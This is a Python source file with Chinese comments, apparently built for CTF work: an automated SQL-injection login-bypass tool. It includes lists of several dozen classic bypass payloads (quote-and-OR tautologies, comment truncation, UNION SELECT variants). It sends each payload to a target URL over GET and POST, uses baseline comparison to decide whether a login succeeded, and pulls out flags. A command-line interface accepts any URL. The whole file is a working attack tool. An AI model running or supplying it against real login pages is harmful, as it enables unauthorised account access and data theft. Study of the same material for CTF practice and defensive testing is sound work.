#!/usr/bin/env python3
"""
万能密码注入工具
用于测试和利用万能密码SQL注入漏洞
"""

import asyncio
import aiohttp
import re
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field


@dataclass
class UniversalPasswordTestResult:
    """万能密码测试结果"""
    target_url: str
    payloads_tested: int = 0
    successful_payloads: List[Dict[str, Any]] = field(default_factory=list)
    flag_found: bool = False
    flag: Optional[str] = None
    success: bool = False
    error: Optional[str] = None


class UniversalPasswordInjector:
    """万能密码注入器"""
    
    def __init__(self):
        self.logger = None
        self.session = None
        self.baseline_response = None  # 基准响应（使用无效凭证）
        self.baseline_text = None
    
    def set_logger(self, logger):
        """设置日志器"""
        self.logger = logger
    
    async def initialize(self):
        """初始化"""
        if not self.session:
            self.session = aiohttp.ClientSession()
    
    async def close(self):
        """关闭"""
        if self.session:
            await self.session.close()
            self.session = None
    
    async def get_baseline_response(self, target_url: str, method: str = "GET") -> str:
        """获取基准响应（使用无效凭证）"""
        if self.baseline_text is not None:
            return self.baseline_text
        
        try:
            # 使用明显无效的凭证
            params = {"username": "invalid_user_12345", "password": "invalid_pass_12345"}
            
            if method.upper() == "GET":
                async with self.session.get(target_url, params=params, timeout=10) as response:
                    self.baseline_text = await response.text()
            else:  # POST
                async with self.session.post(target_url, data=params, timeout=10) as response:
                    self.baseline_text = await response.text()
            
            return self.baseline_text
        except Exception as e:
            if self.logger:
                self.logger.error(f"获取基准响应失败: {e}")
            return ""
    
    def get_standard_payloads(self) -> List[Dict[str, str]]:
        """获取标准万能密码payload"""
        return [
            # 经典万能密码
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "admin", "password": "' OR 1=1--"},
            {"username": "admin", "password": "' OR 'a'='a"},
            {"username": "admin", "password": "' OR ''='"},
            
            # 变体
            {"username": "' OR '1'='1", "password": "anything"},
            {"username": "admin' OR '1'='1'--", "password": "anything"},
            {"username": "admin'--", "password": "anything"},
            {"username": "admin'#", "password": "anything"},
            
            # 双引号变体
            {"username": "admin", "password": '" OR "1"="1'},
            {"username": '" OR "1"="1', "password": "anything"},
            
            # 无引号变体
            {"username": "admin", "password": " OR 1=1"},
            {"username": " OR 1=1", "password": "anything"},
            
            # 管理员万能密码
            {"username": "admin", "password": "admin' OR '1'='1"},
            {"username": "administrator", "password": "' OR '1'='1"},
            
            # 注释变体
            {"username": "admin'/*", "password": "*/ OR '1'='1"},
            {"username": "admin'-- -", "password": "anything"},
            {"username": "admin'#", "password": "anything"},
            
            # 高级变体
            {"username": "admin", "password": "' OR '1'='1' LIMIT 1--"},
            {"username": "admin", "password": "' OR '1'='1' UNION SELECT 1,2,3--"},
            {"username": "admin", "password": "' OR EXISTS(SELECT * FROM users)--"},
            
            # 登录页面特定payload
            {"username": "admin", "password": "' OR '1'='1' OR '"},
            {"username": "admin", "password": "' OR '1'='1' OR ''='"},
            {"username": "admin", "password": "' OR '1'='1' OR 'x'='x"},
        ]
    
    def get_login_form_payloads(self) -> List[Dict[str, str]]:
        """获取登录表单专用payload"""
        return [
            # 登录绕过payload - 用户名字段注入
            {"username": "admin'--", "password": ""},
            {"username": "admin'#", "password": ""},
            {"username": "admin'/*", "password": ""},
            {"username": "' OR 1=1--", "password": ""},
            {"username": "' OR '1'='1'--", "password": ""},
            {"username": "admin' OR '1'='1", "password": "password"},
            {"username": "admin' OR '1'='1'--", "password": "password"},
            
            # 新增：用户反馈的有效payload
            {"username": "admin' or 1=1#", "password": ""},
            {"username": "admin' or 1=1--", "password": ""},
            {"username": "admin' or '1'='1'#", "password": ""},
            {"username": "admin' or '1'='1'--", "password": ""},
            {"username": "admin' or 'a'='a'#", "password": ""},
            
            # 大小写变体
            {"username": "admin' OR 1=1#", "password": ""},
            {"username": "ADMIN' OR 1=1#", "password": ""},
            {"username": "admin' Or 1=1#", "password": ""},
            
            # 无空格变体
            {"username": "admin'or1=1#", "password": ""},
            {"username": "admin'OR'1'='1'#", "password": ""},
            
            # 密码字段注入
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "admin", "password": "' OR 1=1--"},
            {"username": "admin", "password": "' OR 'a'='a"},
            {"username": "admin", "password": "' OR 1=1#"},
            {"username": "admin", "password": "' OR '1'='1'#"},
            
            # 双字段注入
            {"username": "' OR '1'='1", "password": "' OR '1'='1"},
            {"username": "' OR 1=1--", "password": "' OR 1=1--"},
            {"username": "' OR 1=1#", "password": "' OR 1=1#"},
            {"username": "admin' or 1=1#", "password": "anything"},
        ]
    
    def detect_flag(self, text: str) -> Optional[str]:
        """从文本中检测flag"""
        flag_patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'[A-Za-z0-9]{32}',  # 32位哈希
            r'[A-Za-z0-9]{64}',  # 64位哈希
        ]
        
        for pattern in flag_patterns:
            match = re.search(pattern, text)
            if match:
                return match.group()
        
        return None
    
    def detect_success_indicators(self, text: str, baseline_text: str = None) -> List[str]:
        """检测成功登录的指示器"""
        text_lower = text.lower()
        indicators = []
        
        # 传统成功关键词
        success_keywords = [
            "登录成功", "登录成功", "success", "welcome", "dashboard", 
            "admin", "logout", "退出", "logged in", "welcome back",
            "profile", "account", "member", "user panel"
        ]
        
        for keyword in success_keywords:
            if keyword.lower() in text_lower:
                indicators.append(keyword)
        
        # 如果提供了基准响应，检查错误消息是否消失
        if baseline_text:
            # 常见错误消息
            error_patterns = [
                r"wrong.*username.*password",
                r"invalid.*credentials",
                r"login.*failed",
                r"incorrect.*password",
                r"authentication.*failed",
                r"no.*wrong",
                r"错误.*用户名.*密码",
                r"登录.*失败",
            ]
            
            # 检查基准响应中是否有错误消息
            baseline_has_error = False
            for pattern in error_patterns:
                if re.search(pattern, baseline_text, re.IGNORECASE):
                    baseline_has_error = True
                    break
            
            # 检查当前响应中是否没有错误消息
            if baseline_has_error:
                current_has_error = False
                for pattern in error_patterns:
                    if re.search(pattern, text, re.IGNORECASE):
                        current_has_error = True
                        break
                
                # 如果基准有错误但当前没有错误，可能表示成功
                if not current_has_error:
                    indicators.append("error_message_disappeared")
        
        return indicators
    
    def detect_error_indicators(self, text: str) -> List[str]:
        """检测数据库错误指示器"""
        text_lower = text.lower()
        indicators = []
        
        error_keywords = [
            "mysql", "database", "sql", "syntax", "error", "warning",
            "exception", "failed", "invalid", "unexpected", "query",
            "statement", "sqlite", "postgresql", "oracle", "mssql"
        ]
        
        for keyword in error_keywords:
            if keyword.lower() in text_lower:
                indicators.append(keyword)
        
        return indicators
    
    def analyze_response_difference(self, response_text: str, baseline_text: str) -> Dict[str, Any]:
        """分析响应与基准的差异"""
        analysis = {
            "length_difference": len(response_text) - len(baseline_text),
            "content_different": response_text != baseline_text,
            "error_message_changed": False,
            "success_indicators_found": [],
            "likely_success": False
        }
        
        # 检查错误消息变化
        error_keywords = ["wrong", "invalid", "failed", "incorrect", "error", "no"]
        baseline_has_error = any(keyword in baseline_text.lower() for keyword in error_keywords)
        response_has_error = any(keyword in response_text.lower() for keyword in error_keywords)
        
        if baseline_has_error and not response_has_error:
            analysis["error_message_changed"] = True
            analysis["likely_success"] = True
            analysis["success_indicators_found"].append("error_message_disappeared")
        
        # 检查响应长度显著变化（超过10%）
        if len(baseline_text) > 0:
            length_ratio = len(response_text) / len(baseline_text)
            if abs(length_ratio - 1.0) > 0.1:  # 变化超过10%
                analysis["success_indicators_found"].append(f"length_change_{length_ratio:.2f}")
                analysis["likely_success"] = True
        
        # 检查特定关键词出现
        success_keywords = ["welcome", "success", "dashboard", "admin", "logout"]
        for keyword in success_keywords:
            if keyword in response_text.lower() and keyword not in baseline_text.lower():
                analysis["success_indicators_found"].append(f"new_keyword_{keyword}")
                analysis["likely_success"] = True
        
        return analysis
    
    async def test_payload(self, target_url: str, payload: Dict[str, str], 
                          method: str = "GET") -> Dict[str, Any]:
        """测试单个payload"""
        try:
            params = {
                "username": payload["username"],
                "password": payload["password"]
            }
            
            # 获取基准响应
            baseline_text = await self.get_baseline_response(target_url, method)
            
            if method.upper() == "GET":
                async with self.session.get(target_url, params=params, timeout=10) as response:
                    response_text = await response.text()
                    status_code = response.status
            else:  # POST
                async with self.session.post(target_url, data=params, timeout=10) as response:
                    response_text = await response.text()
                    status_code = response.status
            
            # 分析响应
            flag = self.detect_flag(response_text)
            success_indicators = self.detect_success_indicators(response_text, baseline_text)
            error_indicators = self.detect_error_indicators(response_text)
            difference_analysis = self.analyze_response_difference(response_text, baseline_text)
            
            # 判断是否成功
            is_success = (
                flag is not None or 
                len(success_indicators) > 0 or 
                difference_analysis["likely_success"]
            )
            
            result = {
                "payload": payload,
                "method": method,
                "status_code": status_code,
                "response_length": len(response_text),
                "baseline_length": len(baseline_text),
                "flag_found": flag is not None,
                "flag": flag,
                "success_indicators": success_indicators,
                "error_indicators": error_indicators,
                "difference_analysis": difference_analysis,
                "success": is_success
            }
            
            return result
            
        except Exception as e:
            return {
                "payload": payload,
                "method": method,
                "error": str(e),
                "success": False
            }
    
    async def test_target(self, target_url: str, 
                         payloads: Optional[List[Dict[str, str]]] = None,
                         methods: List[str] = ["GET", "POST"]) -> UniversalPasswordTestResult:
        """测试目标URL"""
        result = UniversalPasswordTestResult(target_url=target_url)
        
        try:
            await self.initialize()
            
            # 使用提供的payload或默认payload
            if payloads is None:
                payloads = self.get_standard_payloads() + self.get_login_form_payloads()
            
            result.payloads_tested = len(payloads)
            
            # 测试每个payload
            for payload in payloads:
                for method in methods:
                    test_result = await self.test_payload(target_url, payload, method)
                    
                    if test_result.get("flag_found"):
                        result.flag_found = True
                        result.flag = test_result["flag"]
                        result.success = True
                        
                        result.successful_payloads.append({
                            "payload": payload,
                            "method": method,
                            "result": test_result
                        })
                        
                        # 找到flag就返回
                        return result
                    
                    elif test_result.get("success"):
                        result.successful_payloads.append({
                            "payload": payload,
                            "method": method,
                            "result": test_result
                        })
            
            # 如果有成功的payload，标记为成功
            if result.successful_payloads:
                result.success = True
            
            return result
            
        except Exception as e:
            result.error = str(e)
            result.success = False
            return result
    
    async def brute_force_login_form(self, target_url: str, 
                                    username_field: str = "username",
                                    password_field: str = "password") -> Dict[str, Any]:
        """暴力破解登录表单"""
        result = {
            "target_url": target_url,
            "username_field": username_field,
            "password_field": password_field,
            "payloads_tested": 0,
            "successful_payloads": [],
            "flag_found": False,
            "flag": None,
            "success": False
        }
        
        try:
            await self.initialize()
            
            # 专门针对登录表单的payload
            login_payloads = self.get_login_form_payloads()
            result["payloads_tested"] = len(login_payloads)
            
            for payload in login_payloads:
                # 构建表单数据
                form_data = {
                    username_field: payload["username"],
                    password_field: payload["password"]
                }
                
                try:
                    async with self.session.post(target_url, data=form_data, timeout=10) as response:
                        response_text = await response.text()
                        
                        # 检查flag
                        flag = self.detect_flag(response_text)
                        if flag:
                            result["flag_found"] = True
                            result["flag"] = flag
                            result["success"] = True
                            
                            result["successful_payloads"].append({
                                "payload": payload,
                                "method": "POST",
                                "status_code": response.status,
                                "flag": flag
                            })
                            
                            return result
                        
                        # 检查成功指示器
                        success_indicators = self.detect_success_indicators(response_text)
                        if success_indicators:
                            result["successful_payloads"].append({
                                "payload": payload,
                                "method": "POST",
                                "status_code": response.status,
                                "success_indicators": success_indicators
                            })
                
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"Payload测试失败: {e}")
            
            # 如果有成功的payload，标记为成功
            if result["successful_payloads"]:
                result["success"] = True
            
            return result
            
        except Exception as e:
            result["error"] = str(e)
            return result


# 工具函数
async def universal_password_injection_tool(target_url: str, 
                                          payload_type: str = "all",
                                          method: str = "both") -> Dict[str, Any]:
    """
    万能密码注入工具
    
    Args:
        target_url: 目标URL
        payload_type: payload类型 (all, standard, login_form)
        method: 请求方法 (both, GET, POST)
    
    Returns:
        测试结果
    """
    injector = UniversalPasswordInjector()
    
    try:
        # 根据参数选择payload
        if payload_type == "standard":
            payloads = injector.get_standard_payloads()
        elif payload_type == "login_form":
            payloads = injector.get_login_form_payloads()
        else:  # all
            payloads = injector.get_standard_payloads() + injector.get_login_form_payloads()
        
        # 根据参数选择方法
        if method == "both":
            methods = ["GET", "POST"]
        else:
            methods = [method]
        
        # 执行测试
        result = await injector.test_target(target_url, payloads, methods)
        
        return {
            "success": result.success,
            "target_url": result.target_url,
            "payloads_tested": result.payloads_tested,
            "successful_payloads_count": len(result.successful_payloads),
            "flag_found": result.flag_found,
            "flag": result.flag,
            "successful_payloads": result.successful_payloads[:5],  # 只返回前5个成功的payload
            "error": result.error
        }
        
    finally:
        await injector.close()


# 命令行接口
async def main():
    """命令行主函数"""
    import argparse
    import json
    
    parser = argparse.ArgumentParser(description="万能密码注入测试工具")
    parser.add_argument("target", help="目标URL")
    parser.add_argument("--payload-type", choices=["all", "standard", "login_form"], 
                       default="all", help="payload类型")
    parser.add_argument("--method", choices=["both", "GET", "POST"], 
                       default="both", help="请求方法")
    parser.add_argument("--output", help="输出文件路径")
    
    args = parser.parse_args()
    
    print(f"测试目标: {args.target}")
    print(f"Payload类型: {args.payload_type}")
    print(f"请求方法: {args.method}")
    print("="*60)
    
    result = await universal_password_injection_tool(
        args.target, args.payload_type, args.method
    )
    
    # 打印结果
    print(f"测试完成!")
    print(f"Payload测试数: {result['payloads_tested']}")
    print(f"成功Payload数: {result['successful_payloads_count']}")
    print(f"找到Flag: {'✅ 是' if result['flag_found'] else '❌ 否'}")
    
    if result['flag_found']:
        print(f"🎉 Flag: {result['flag']}")
    
    if result['successful_payloads']:
        print("\n成功的Payload:")
        for i, payload in enumerate(result['successful_payloads'][:3]):
            print(f"  {i+1}. {payload['payload']} ({payload['method']})")
    
    # 保存结果
    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
        print(f"\n结果已保存到: {args.output}")
    
    return 0 if result['success'] else 1


if __name__ == "__main__":
    # 运行命令行接口
    exit_code = asyncio.run(main())
    exit(exit_code)